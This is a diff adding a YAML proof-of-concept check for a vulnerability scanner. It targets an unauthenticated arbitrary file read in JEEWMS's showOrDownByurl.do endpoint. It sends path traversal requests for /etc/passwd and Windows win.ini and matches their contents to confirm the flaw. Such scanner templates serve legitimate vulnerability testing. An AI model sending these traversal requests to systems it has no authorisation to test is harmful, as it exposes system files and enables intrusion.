@@ -1,0 +1,16 @@
+name: poc-yaml-jeewms-showordownbyurl-fileread
+groups:
+  linux:
+    - method: GET
+      path: /systemController/showOrDownByurl.do?down=&dbPath=../../../../../../etc/passwd
+      expression: |
+        response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+  windows:
+    - method: GET
+      path: /systemController/showOrDownByurl.do?down=&dbPath=../Windows/win.ini
+      expression: |
+        response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+detail:
+  author: B1anda0(https://github.com/B1anda0)
+  links:
+    - http://wiki.xypbk.com/Web%E5%AE%89%E5%85%A8/JEEWMS/JEEWMS%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
